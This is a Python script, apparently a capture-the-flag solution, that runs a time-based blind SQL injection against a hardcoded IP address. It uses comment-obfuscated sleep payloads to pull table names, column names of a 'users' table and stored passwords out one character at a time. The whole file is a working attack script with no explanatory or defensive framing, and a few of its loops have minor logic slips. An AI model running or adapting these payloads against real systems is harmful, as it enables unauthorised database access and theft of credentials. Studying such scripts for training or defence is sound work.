import requests
import datetime

url='http://121.40.195.127:7008/?id=1"'
def get_table():
    table1 = ''
    for i in range(1):
        for j in range(6):
            for k in range(32,127):
                payload = "and/**/if(ascii(mid((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/{},1),{},1))={},sleep(2),1)%23".format(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url + payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                # print(difference)
                if difference > 2:
                    #这里是因为只有一个表
                    if i == 0:
                        table1 += chr(k)
                        print("第一个表为->"+table1)
                    else:
                        break
get_table()

def get_column():
    column1 = ''
    column2 = ''
    column3 = ''
    for i in range(3):
        for j in range(1,9):
            for k in range(32,127):
                payload = "and/**/if(ascii(mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=\'users\'/**/limit/**/{},1),{},1))={},sleep(2),1)%23".format(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url+payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        column1 += chr(k)
                        print("字段一为->"+column1)
                    if i == 1:
                        column2 += chr(k)
                        print("字段二为->"+column2)
                    if i == 2:
                        column3 += chr(k)
                        print("字段三为->"+column3)
                    else:
                        break
get_column()

def get_flag():
    flag = ''
    for i in range(30):
        for k in range(32,127):
            payload = "and/**/if(ascii(mid((select/**/password/**/from/**/users),{},1))={},sleep(2),1)%23".format(i,k)
            time1 = datetime.datetime.now()
            res = requests.get(url+payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                flag += chr(k)
                print("flag为->"+flag)
get_flag()